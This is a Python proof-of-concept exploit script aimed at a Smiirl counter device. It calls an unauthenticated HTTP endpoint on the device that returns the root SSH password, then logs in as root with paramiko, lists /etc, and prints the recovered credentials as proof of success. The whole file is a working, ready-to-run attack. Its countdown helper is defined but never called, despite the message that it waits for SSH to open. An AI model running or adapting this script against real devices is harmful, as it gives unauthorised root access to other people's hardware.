import warnings
from cryptography.utils import CryptographyDeprecationWarning
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)
import json, urllib.request
import paramiko
import time
from IPython.display import clear_output
import argparse

parser = argparse.ArgumentParser(
    description="Fetch a rotating password from the counter's HTTP endpoint, "
                "wait out the countdown, then SSH in as root and run ls -la to confirm.",
    epilog="example: python POC.py 192.168.1.1 80")
parser.add_argument("ip", nargs="?", default="192.168.1.1",
                    help="target IP address (default: 192.168.1.1)")
parser.add_argument("port", nargs="?", default="80",
                    help="target HTTP port (default: 80)")
args = parser.parse_args()
smiirlCounterIp = args.ip
port = args.port


def print_table(header, rows):
    cols = list(zip(header, *rows)) if rows else [(header[0],), (header[1],)]
    w = [max(len(str(c)) for c in col) for col in cols]
    line = "+" + "+".join("-" * (n + 2) for n in w) + "+"
    def fmt(cells):
        return "| " + " | ".join(str(c).ljust(w[i]) for i, c in enumerate(cells)) + " |"
    print(line); print(fmt(header)); print(line)
    for r in rows:
        print(fmt(r))
    print(line)


def GetPassword(smiirlCounterIp, port):
        print("URL is: http://"+smiirlCounterIp+":"+port+"/cgi-bin/luci/smiirl/api/activate/ssh")
        with urllib.request.urlopen("http://"+smiirlCounterIp+":"+port+"/cgi-bin/luci/smiirl/api/activate/ssh") as r:
            pw = json.load(r)["password"]
            print(f"Password is: {pw}")
            return pw

def connSSH(smiirlCounterIp, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
         username = "root"
         ssh.connect(smiirlCounterIp, username=username, password=password,
                     allow_agent=False, look_for_keys=False)
         stdin, stdout, stderr = ssh.exec_command('pwd;ls -la /etc/')
         output = stdout.read().decode('utf-8')
         error = stderr.read().decode('utf-8')

         rows = [("SUCESS!", ""), ("User", username), ("Password", password)]
         out_lines = output.splitlines() or [""]
         rows.append(("Directory", out_lines[0]))
         rows.extend(("", line) for line in out_lines[1:])
         print_table(("Field", "Value"), rows)
         if error:
             print("Error:", error)
    except paramiko.AuthenticationException:
        print("Authentication failed. Check username and password.")
    except paramiko.SSHException as e:
        print(f"SSH connection error: {e}")
    finally:
        ssh.close()
        
def timeDelay(SLEEPTIME):
    for x in range(SLEEPTIME, 0, -1):
        print(f"Time left: {x}s".ljust(20), end="\r", flush=True)
        time.sleep(1)
    print()
        
password = GetPassword(smiirlCounterIp, port)
print("Now we wait for the SSH to open!")
connSSH(smiirlCounterIp, password)
print(f"SSH is now accessible. User: root , Password: {password}")
